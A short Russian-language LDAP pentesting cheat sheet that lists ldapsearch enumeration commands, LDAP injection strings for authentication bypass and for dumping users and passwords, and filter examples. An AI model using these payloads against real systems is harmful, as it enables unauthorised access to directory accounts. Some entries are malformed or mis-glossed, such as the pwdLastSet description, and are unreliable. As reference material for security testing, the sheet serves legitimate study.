# LDAP Pentest Cheatsheet

## Что это?
LDAP - протокол доступа к каталогам (Active Directory, корпоративные телефонные книги). Хранит пользователей, группы, компьютеры, пароли.

## Зачем пентестеру?
- Сбор информации о структуре компании
- Поиск учеток, групп, админов
- Получение хешей паролей
- LDAP инъекции для обхода авторизации

## Базовые запросы
ldapsearch -x -H ldap://IP:389 -b "dc=company,dc=com" "(objectClass=*)"
ldapsearch -x -H ldap://IP -b "dc=company,dc=com" "(&(objectClass=user)(cn=*))"
ldapsearch -x -H ldap://IP -b "dc=company,dc=com" "(sAMAccountName=admin)"

## Инъекции (в поле ввода)
*                 # вернуть всех
admin*            # начинается с admin
admin)(&          # обход аутентификации
*)(uid=*          # все пользователи
*)(|(password=*)  # все с паролем
*)(|(&password=*)) 

# AND примеры:
(&(uid=admin)(password=*))     # admin И с паролем
(&(uid=admin)(uid=root))       # admin И root (никогда не сработает)

# OR примеры:
(|(uid=admin)(uid=root))       # admin ИЛИ root
(|(password=123)(password=456)) # пароль 123 ИЛИ 456

# Комбинации:
(&(uid=admin)(|(password=123)(password=456)))  # admin И (пароль 123 ИЛИ 456)
---------------------

## Полезные фильтры
(objectClass=*)           - все
(cn=*admin*)             - admin в имени
(&(objectClass=user)(!(userPassword=*))) - юзеры без пароля
(memberOf=cn=Admins,ou=Groups,...) - члены группы
(pwdLastSet=0)            - пароль никогда не менялся

## Порты: 389 (без шифра), 636 (SSL)